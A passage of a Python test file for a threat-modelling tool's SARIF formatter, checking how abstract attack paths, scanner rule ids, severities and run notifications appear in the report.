        note = run["invocations"][0]["toolExecutionNotifications"][0]
        assert note["descriptor"]["id"] == "sarif.truncated"
        assert "3 lower-severity" in note["message"]["text"]


# ---------------------------------------------------------------------------------------
# Attack paths
# ---------------------------------------------------------------------------------------


def hop(
    node_id: str,
    zone: str,
    edge: str | None,
    *,
    enabled_by: tuple[str, ...] = (),
    techniques: tuple[str, ...] = (),
) -> AttackHop:
    return AttackHop(
        node_id=node_id,
        zone=zone,
        edge_type_to_next=edge,
        enabled_by=list(enabled_by),
        techniques=list(techniques),
        via={"ports": [443]} if edge else {},
    )


def path_graph() -> InfraGraph:
    resources = [
        ParsedResource(
            resource_type=rtype,
            name=name,
            provider="aws",
            address=f"{rtype}.{name}",
            properties={},
            source_location="infra/main.tf",
            start_line=start,
            end_line=start + 3,
        )
        for rtype, name, start in (
            ("aws_lb", "web", 5),
            ("aws_instance", "app", 20),
            ("aws_db_instance", "main", 40),
        )
    ]
    return InfraGraph.from_parsed(
        ParsedOutput(source_path="infra/main.tf", format_type="terraform_hcl", resources=resources)
    )


def make_path(severity: Severity = Severity.CRITICAL) -> AttackPath:
    hops = [
        hop("internet", "internet", "network_flow"),
        hop("aws_lb.web", "dmz", "network_flow", enabled_by=("t1",), techniques=("T1190",)),
        hop("aws_instance.app", "private", "network_flow"),
        hop("aws_db_instance.main", "data", None, techniques=("T1530",)),
    ]
    return AttackPath(
        id="0123456789ab",
        entry="internet",
        target="aws_db_instance.main",
        hops=hops,
        severity=severity,
        score=88.0,
        rationale="The database is reachable from the internet.",
        techniques=["T1190", "T1530"],
        tactics=["TA0001", "TA0009"],
    )


class TestAttackPaths:
    def result_for(self, path: AttackPath, graph: InfraGraph | None) -> dict[str, Any]:
        report = ThreatReport(
            threats=[make_threat(address="aws_lb.web")], attack_paths=[path], input_file="infra"
        )
        run = json.loads(format_sarif(report, graph))["runs"][0]
        results = [r for r in run["results"] if r["ruleId"].startswith(ATTACK_PATH_RULE)]
        assert len(results) == 1
        return results[0]  # type: ignore[no-any-return]

    def test_a_path_is_one_result_with_a_rule_of_its_own(self) -> None:
        report = ThreatReport(threats=[make_threat()], attack_paths=[make_path()])
        run = json.loads(format_sarif(report, path_graph()))["runs"][0]
        assert run["results"][0]["ruleId"] == ATTACK_PATH_RULE == "THREATCODE_ATTACK_PATH"
        rule = rules_by_id(run)[ATTACK_PATH_RULE]
        assert rule["name"] == "AttackPath"
        assert rule["properties"]["security-severity"] == "9.5"
        assert "attack-path" in rule["properties"]["tags"]
        assert run["results"][0]["ruleIndex"] == 0

    def test_the_level_follows_the_path_severity(self) -> None:
        assert self.result_for(make_path(Severity.CRITICAL), path_graph())["level"] == "error"
        assert self.result_for(make_path(Severity.MEDIUM), path_graph())["level"] == "warning"

    def test_a_path_rule_has_the_severity_of_its_paths(self) -> None:
        paths = [make_path(Severity.CRITICAL), make_path(Severity.MEDIUM)]
        paths[1].id = "ffffffffffff"
        report = ThreatReport(threats=[make_threat()], attack_paths=paths)
        run = json.loads(format_sarif(report, path_graph()))["runs"][0]
        rules = rules_by_id(run)
        assert rules[ATTACK_PATH_RULE]["properties"]["security-severity"] == "9.5"
        medium = rules[f"{ATTACK_PATH_RULE}/medium"]
        assert medium["properties"]["security-severity"] == "5.5"
        assert medium["defaultConfiguration"]["level"] == "warning"
        by_id = {
            r["properties"]["attack_path_id"]: r
            for r in run["results"]
            if "attack_path_id" in r["properties"]
        }
        assert by_id["0123456789ab"]["ruleId"] == ATTACK_PATH_RULE
        assert by_id["ffffffffffff"]["ruleId"] == f"{ATTACK_PATH_RULE}/medium"
        assert by_id["ffffffffffff"]["properties"]["security-severity"] == "5.5"

    def test_a_code_flow_walks_the_hops_in_order(self) -> None:
        result = self.result_for(make_path(), path_graph())
        flows = result["codeFlows"]
        assert len(flows) == 1 and len(flows[0]["threadFlows"]) == 1
        steps = flows[0]["threadFlows"][0]["locations"]
        names = [s["location"]["logicalLocations"][0]["fullyQualifiedName"] for s in steps]
        assert names == ["internet", "aws_lb.web", "aws_instance.app", "aws_db_instance.main"]
        assert [s["executionOrder"] for s in steps] == [1, 2, 3, 4]

    def test_hops_with_a_definition_carry_the_file_and_line(self) -> None:
        steps = self.result_for(make_path(), path_graph())["codeFlows"][0]["threadFlows"][0][
            "locations"
        ]
        by_name = {
            s["location"]["logicalLocations"][0]["fullyQualifiedName"]: s["location"] for s in steps
        }
        web = by_name["aws_lb.web"]["physicalLocation"]
        assert web["artifactLocation"]["uri"] == "infra/main.tf"
        assert web["region"] == {"startLine": 5, "endLine": 8}

    def test_the_internet_hop_is_shown_at_the_resource_it_enters(self) -> None:
        steps = self.result_for(make_path(), path_graph())["codeFlows"][0]["threadFlows"][0][
            "locations"
        ]
        first = steps[0]["location"]
        assert first["logicalLocations"][0]["fullyQualifiedName"] == "internet"
        assert first["physicalLocation"]["region"]["startLine"] == 5
        assert "shown at aws_lb.web" in first["message"]["text"]

    def test_every_step_and_related_location_has_a_physical_location_when_a_hop_has_a_file(
        self,
    ) -> None:
        result = self.result_for(make_path(), path_graph())
        steps = result["codeFlows"][0]["threadFlows"][0]["locations"]
        assert all("physicalLocation" in s["location"] for s in steps)
        assert all("physicalLocation" in r for r in result["relatedLocations"])

    def test_a_hop_message_names_the_findings_that_enable_it(self) -> None:
        enabling = make_threat(threat_id="t1", address="aws_lb.web", rule_id="LB_OPEN")
        report = ThreatReport(threats=[enabling], attack_paths=[make_path()])
        run = json.loads(format_sarif(report, path_graph()))["runs"][0]
        result = next(r for r in run["results"] if r["ruleId"].startswith(ATTACK_PATH_RULE))
        steps = result["codeFlows"][0]["threadFlows"][0]["locations"]
        texts = [s["location"]["message"]["text"] for s in steps]
        assert texts[1].startswith("Hop 2: aws_lb.web -> aws_instance.app (sends traffic on ")
        assert all("network_flow" not in text for text in texts)
        assert "enabled by LB_OPEN" in texts[1]
        assert "enabled by" not in texts[2]

    def test_a_hop_message_uses_the_rule_id_the_alert_carries(self) -> None:
        enabling = make_threat(
            threat_id="t1",
            address="aws_lb.web",
            rule_id="LB_OPEN",
            severity=Severity.MEDIUM,
            effective_severity=Severity.HIGH,
        )
        report = ThreatReport(threats=[enabling], attack_paths=[make_path()])
        run = json.loads(format_sarif(report, path_graph()))["runs"][0]
        ids = {r["ruleId"] for r in run["results"]}
        assert "LB_OPEN/high" in ids
        result = next(r for r in run["results"] if r["ruleId"].startswith(ATTACK_PATH_RULE))
        text = result["relatedLocations"][1]["message"]["text"]
        assert "enabled by LB_OPEN/high" in text

    def test_a_hop_message_names_the_ports_of_a_flow(self) -> None:
        result = self.result_for(make_path(), path_graph())
        text = result["relatedLocations"][0]["message"]["text"]
        assert "(sends traffic on HTTPS 443)" in text
        assert "network_flow" not in text and "data_flow" not in text

    def test_every_hop_is_a_related_location(self) -> None:
        related = self.result_for(make_path(), path_graph())["relatedLocations"]
        assert [r["id"] for r in related] == [1, 2, 3, 4]
        assert related[1]["message"]["text"].startswith("Hop 2: aws_lb.web")

    def test_the_primary_location_is_the_first_resource_with_a_file(self) -> None:
        # The entry point, where a fix goes, not the target the path ends at.
        result = self.result_for(make_path(), path_graph())
        location = primary(result)
        assert location["region"]["startLine"] == 5
        assert result["locations"][0]["logicalLocations"][0]["fullyQualifiedName"] == "aws_lb.web"
        assert "entering at aws_lb.web" in result["message"]["text"]

    def test_the_path_message_is_short_and_the_story_is_in_the_code_flow(self) -> None:
        result = self.result_for(make_path(), path_graph())
        assert "The database is reachable" not in result["message"]["text"]
        assert "The database is reachable" in result["codeFlows"][0]["message"]["text"]

    def test_without_a_graph_the_result_still_has_a_physical_location_and_region(self) -> None:
        result = self.result_for(make_path(), None)
        location = primary(result)
        assert location["artifactLocation"]["uri"] == "infra"
        assert location["region"] == {"startLine": 1}
        steps = result["codeFlows"][0]["threadFlows"][0]["locations"]
        assert all("physicalLocation" not in s["location"] for s in steps)

    def test_the_path_fingerprint_is_stable_and_follows_the_path_id(self) -> None:
        one = self.result_for(make_path(), path_graph())["partialFingerprints"]
        two = self.result_for(make_path(), None)["partialFingerprints"]
        assert one == two and one[FINGERPRINT_KEY]
        other = make_path()
        other.id = "ffffffffffff"
        assert self.result_for(other, None)["partialFingerprints"] != one

    def test_threats_on_a_path_carry_its_id(self) -> None:
        report = ThreatReport(
            threats=[make_threat(address="aws_lb.web"), make_threat(threat_id="o", address="zzz")],
            attack_paths=[make_path()],
        )
        run = json.loads(format_sarif(report, path_graph()))["runs"][0]
        by_address = {
            r["locations"][0]["logicalLocations"][0]["fullyQualifiedName"]: r
            for r in run["results"]
            if r["ruleId"] != ATTACK_PATH_RULE
        }
        assert by_address["aws_lb.web"]["properties"]["attack_path_ids"] == ["0123456789ab"]
        assert "attack_path_ids" not in by_address["zzz"]["properties"]

    def test_the_path_properties_carry_the_score_and_the_techniques(self) -> None:
        props = self.result_for(make_path(), None)["properties"]
        assert props["attack_path_id"] == "0123456789ab"
        assert props["score"] == 88.0
        assert props["techniques"] == ["T1190", "T1530"]

    def test_a_scan_without_paths_has_no_path_rule(self) -> None:
        assert ATTACK_PATH_RULE not in rules_by_id(run_of(make_threat()))


# ---------------------------------------------------------------------------------------
# Rule ids and names (FV-23)
# ---------------------------------------------------------------------------------------


def scanner_threat(rule_id: str, tool: str = "trivy", **fields: Any) -> Threat:
    return make_threat(
        rule_id=rule_id,
        source=ThreatSource.SCANNER,
        tool=tool,
        evidence="scanner",
        title=fields.pop(
            "title", "CVE-2022-37434: zlib: heap-based buffer over-read and overflow in inflate()"
        ),
        **fields,
    )


class TestScannerRuleIds:
    def test_an_id_that_already_carries_the_tool_prefix_is_not_prefixed_again(self) -> None:
        assert rule_key(scanner_threat("trivy:CVE-2022-37434")) == "trivy:CVE-2022-37434"

    def test_a_bare_id_gets_the_tool_prefix_once(self) -> None:
        assert rule_key(scanner_threat("CVE-2022-37434")) == "trivy:CVE-2022-37434"

    def test_another_tools_prefix_is_not_mistaken_for_the_tools_own(self) -> None:
        assert rule_key(scanner_threat("grype:CVE-1", tool="trivy")) == "trivy:grype:CVE-1"

    def test_the_rule_in_the_document_has_one_prefix(self) -> None:
        run = run_of(scanner_threat("trivy:CVE-2022-37434"))
        assert [r["id"] for r in run["tool"]["driver"]["rules"]] == ["trivy:CVE-2022-37434"]
        assert run["results"][0]["ruleId"] == "trivy:CVE-2022-37434"

    @pytest.mark.parametrize(
        "fixture",
        [
            "grype-image.json",
            "osv-lockfile.json",
            "sarif-checkov.json",
            "sarif-gitleaks.json",
            "sarif-trivy.json",
            "trivy-fs.json",
            "trivy-image.json",
        ],
    )
    def test_no_ingest_reader_produces_a_doubled_prefix(self, fixture: str) -> None:
        from threatcode.formatters import render
        from threatcode.pipeline import prepare_request, run_scan

        prepared = prepare_request(
            [str(REPO_ROOT / "examples" / "aws-webapp")],
            ingest=[FIXTURES / "ingest" / fixture],
            fail_on="none",
        )
        analysis = run_scan(prepared.request).analysis
        run = json.loads(render("sarif", analysis))["runs"][0]
        scanner = [r for r in run["tool"]["driver"]["rules"] if ":" in r["id"]]
        assert scanner, fixture
        for rule in scanner:
            tool, _, rest = rule["id"].partition(":")
            assert ":" not in rest, rule["id"]
            assert not rest.startswith(f"{tool}:")


class TestRuleNames:
    def test_an_advisory_id_is_its_own_name(self) -> None:
        run = run_of(scanner_threat("trivy:CVE-2022-37434"))
        assert run["tool"]["driver"]["rules"][0]["name"] == "CVE-2022-37434"

    def test_the_name_comes_from_the_id_not_the_title(self) -> None:
        threat = make_threat(rule_id="K8S_NO_SECCOMP_PROFILE", title="Container without a profile")
        name = run_of(threat)["tool"]["driver"]["rules"][0]["name"]
        assert name == "K8SNoSeccompProfile"

    def test_acronyms_in_an_id_are_kept(self) -> None:
        threat = make_threat(rule_id="MCP_SECRET_IN_CONFIG")
        assert run_of(threat)["tool"]["driver"]["rules"][0]["name"] == "MCPSecretInConfig"

    def test_a_very_long_id_is_cut_at_a_word_not_in_the_middle_of_one(self) -> None:
        rule_id = "_".join(["SEGMENT"] * 30)
        name = run_of(make_threat(rule_id=rule_id))["tool"]["driver"]["rules"][0]["name"]
        assert len(name) <= 64
        assert name == "Segment" * (len(name) // 7)

    def test_a_long_title_is_cut_at_a_word_boundary(self) -> None:
        name = _to_pascal_case("alpha beta " * 30, limit=20)
        assert len(name) <= 20
        assert name in {"AlphaBeta" * n + "Alpha" for n in range(3)} | {"AlphaBeta" * 2}

    def test_boundary_and_llm_rules_have_short_names(self) -> None:
        run = run_of(boundary("b1", "lb", "app1", ("internet", "dmz")), llm_threat("l1", "a"))
        names = {r["id"]: r["name"] for r in run["tool"]["driver"]["rules"]}
        assert names["THREATCODE_BOUNDARY_INTERNET_DMZ"] == "BoundaryInternetDmz"
        assert names[LLM_RULE] == "LLM"


# ---------------------------------------------------------------------------------------
# One severity per rule (FV-24)
# ---------------------------------------------------------------------------------------


class TestOneSeverityPerRule:
    def mixed(self) -> dict[str, Any]:
        return run_of(
            make_threat(threat_id="a", address="x", severity=Severity.LOW),
            make_threat(
                threat_id="b",
                address="y",
                severity=Severity.LOW,
                effective_severity=Severity.HIGH,
                severity_reason="reachable from the internet",
            ),
            make_threat(
                threat_id="c",
                address="z",
                severity=Severity.LOW,
                effective_severity=Severity.MEDIUM,
            ),
        )

    def test_every_result_has_the_level_and_score_of_its_rule(self) -> None:
        run = self.mixed()
        rules = rules_by_id(run)
        for result in run["results"]:
            rule = rules[result["ruleId"]]
            assert result["level"] == rule["defaultConfiguration"]["level"]
            assert (
                result["properties"]["security-severity"]
                == (rule["properties"]["security-severity"])
            )

    def test_the_base_severity_keeps_the_bare_id_and_the_others_are_variants(self) -> None:
        by_address = {
            r["locations"][0]["logicalLocations"][0]["fullyQualifiedName"]: r["ruleId"]
            for r in self.mixed()["results"]
        }
        assert by_address == {"x": "R1", "y": "R1/high", "z": "R1/medium"}

    def test_a_finding_keeps_its_id_when_another_instance_changes(self) -> None:
        alone = run_of(make_threat(threat_id="a", address="x", severity=Severity.LOW))
        with_other = run_of(
            make_threat(threat_id="a", address="x", severity=Severity.LOW),
            make_threat(
                threat_id="b",
                address="y",
                severity=Severity.LOW,
                effective_severity=Severity.CRITICAL,
            ),
        )
        ids = {
            r["locations"][0]["logicalLocations"][0]["fullyQualifiedName"]: r["ruleId"]
            for r in with_other["results"]
        }
        assert alone["results"][0]["ruleId"] == ids["x"] == "R1"

    def test_a_rule_with_one_severity_is_one_rule_with_no_suffix(self) -> None:
        run = run_of(
            make_threat(threat_id="a", address="x"), make_threat(threat_id="b", address="y")
        )
        assert [r["id"] for r in run["tool"]["driver"]["rules"]] == ["R1"]

    def test_a_variant_rule_is_the_same_rule_at_another_severity(self) -> None:
        rules = rules_by_id(self.mixed())
        for suffix in ("high", "medium"):
            variant = rules[f"R1/{suffix}"]
            assert variant["name"] == rules["R1"]["name"]
            assert variant["fullDescription"] == rules["R1"]["fullDescription"]
            assert variant["help"] == rules["R1"]["help"]
        assert rules["R1/high"]["properties"]["security-severity"] == "8.0"
        assert rules["R1/medium"]["properties"]["security-severity"] == "5.5"

    def test_the_rule_indexes_still_point_at_the_rules(self) -> None:
        run = self.mixed()
        rules = run["tool"]["driver"]["rules"]
        for result in run["results"]:
            assert rules[result["ruleIndex"]]["id"] == result["ruleId"]

    def test_boundary_rules_with_different_flow_severities_split(self) -> None:
        high = boundary("b1", "lb", "app1", ("internet", "dmz"))
        medium = boundary("b2", "lb", "app2", ("internet", "dmz"))
        medium.severity = Severity.MEDIUM
        run = run_of(high, medium)
        rules = rules_by_id(run)
        assert set(rules) == {
            "THREATCODE_BOUNDARY_INTERNET_DMZ",
            "THREATCODE_BOUNDARY_INTERNET_DMZ/medium",
        }
        for result in run["results"]:
            assert result["level"] == rules[result["ruleId"]]["defaultConfiguration"]["level"]

    def test_an_info_finding_has_a_note_and_no_score_on_rule_or_result(self) -> None:
        run = run_of(make_threat(severity=Severity.INFO))
        assert "security-severity" not in run["tool"]["driver"]["rules"][0]["properties"]
        assert "security-severity" not in run["results"][0]["properties"]
        assert run["results"][0]["level"] == "note"


# ---------------------------------------------------------------------------------------
# What the report leaves out, and what it was joined to
# ---------------------------------------------------------------------------------------


def notes_of(run: dict[str, Any]) -> dict[str, dict[str, Any]]:
    return {n["descriptor"]["id"]: n for n in run["invocations"][0]["toolExecutionNotifications"]}


class TestSetAsideNotifications:
    def test_suppressed_findings_and_paths_are_counted(self) -> None:
        coverage = Coverage(suppressed=3, suppressed_paths=1)
        note = notes_of(run_of(make_threat(), coverage=coverage))["suppressions.applied"]
        assert note["level"] == "note"
        assert note["message"]["text"] == (
            "2 findings and 1 attack path suppressed by the ignore file and not in this report"
        )

    def test_baselined_findings_are_counted(self) -> None:
        coverage = Coverage(baselined=1)
        text = notes_of(run_of(make_threat(), coverage=coverage))["baseline.applied"]["message"][
            "text"
        ]
        assert text == "1 finding already in the baseline and not in this report"

    def test_findings_hidden_by_min_severity_are_counted_with_the_severity(self) -> None:
        coverage = Coverage(hidden_findings=4, hidden_paths=2, min_severity="high")
        text = notes_of(run_of(make_threat(), coverage=coverage))["min_severity.hidden"]["message"][
            "text"
        ]
        assert text.startswith("4 findings and 2 attack paths below high left out")

    def test_a_report_that_sets_nothing_aside_says_nothing(self) -> None:
        assert notes_of(run_of(make_threat())) == {}

    def test_set_aside_notes_keep_the_invocation_successful(self) -> None:
        coverage = Coverage(suppressed=1, baselined=1, hidden_findings=1, min_severity="low")
        assert run_of(make_threat(), coverage=coverage)["invocations"][0]["executionSuccessful"]


class TestIngestAndLlmNotifications:
    SOURCE = {
        "tool": "trivy",
        "file": "scanner/trivy-app-image.json",
        "findings": 3,
        "attached": 2,
        "unattached": 1,
        "duplicates": 1,
    }

    def run_with(self, sources: list[dict[str, Any]], **report_fields: Any) -> dict[str, Any]:
        report = ThreatReport(threats=[make_threat()], input_file="main.tf", **report_fields)
        return json.loads(format_sarif(report, ingest_sources=sources))["runs"][0]  # type: ignore[no-any-return]

    def test_each_ingested_source_is_a_note(self) -> None:
        text = notes_of(self.run_with([self.SOURCE]))["ingest.source"]["message"]["text"]
        assert text == (
            "ingested 3 trivy findings from scanner/trivy-app-image.json: 2 attached to a "
            "resource, 1 not attached, 1 dropped as already reported"
        )

    def test_no_source_is_no_note(self) -> None:
        assert "ingest.source" not in notes_of(self.run_with([]))

    def test_the_render_path_carries_the_sources_of_the_analysis(self) -> None:
        from threatcode.formatters import render
        from threatcode.models.analysis import AnalysisResult

        analysis = AnalysisResult(
            graph=InfraGraph(),
            report=ThreatReport(threats=[make_threat()], input_file="main.tf"),
            ingest_sources=[dict(self.SOURCE)],
        )
        run = json.loads(render("sarif", analysis))["runs"][0]
        assert "ingest.source" in notes_of(run)

    def test_a_finished_llm_phase_says_its_findings_are_advisory(self) -> None:
        llm = {
            "status": "ran",
            "provider": "anthropic",
            "model": "claude-sonnet-5-5",
            "threat_count": 2,
            "unattributed_count": 1,
            "context": {"reduced": True, "nodes_dropped": 7},
        }
        text = notes_of(self.run_with([], llm=llm))["llm.ran"]["message"]["text"]
        assert "anthropic/claude-sonnet-5-5" in text
        assert "2 advisory findings" in text
        assert "never failing the gate" in text
        assert "reduced to fit the token limit (7 nodes left out)" in text
        assert "1 named no resource in the scan and were set aside" in text

    def test_a_skipped_llm_phase_adds_no_note(self) -> None:
        assert "llm.ran" not in notes_of(self.run_with([], llm={"status": "skipped"}))
